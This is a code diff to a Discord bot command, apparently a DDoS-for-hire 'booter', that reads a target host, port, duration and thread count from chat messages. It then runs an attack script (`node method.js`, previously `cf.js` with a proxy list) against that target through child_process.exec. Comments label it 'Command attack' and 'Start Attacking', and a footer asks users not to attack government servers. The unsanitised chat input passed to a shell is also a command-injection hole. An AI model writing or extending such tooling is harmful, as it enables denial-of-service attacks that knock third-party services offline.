@@ -5,6 +5,7 @@ exports.run = async (client, message, args) => {
 const host = message.content.split (" ")[1]
 const port = message.content.split (" ")[2]
 const duration = message.content.split (" ")[3]
+const thread = message.content.split (" ")[4]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
 
@@ -17,7 +18,7 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`Ex ;cf host time threads`")
+	.setDescription("`Ex ;cf host time methods threads`")
 	.setFooter("Please do not attack government server!")
 	message.channel.send(embed1);
 	return;
@@ -25,7 +26,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node cf.js ${host} ${port} ${duration} GET proxy.txt 100`, (error, stdout, stderr) => {
+exec(`node method.js ${host} ${port} ${duration} ${thread}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
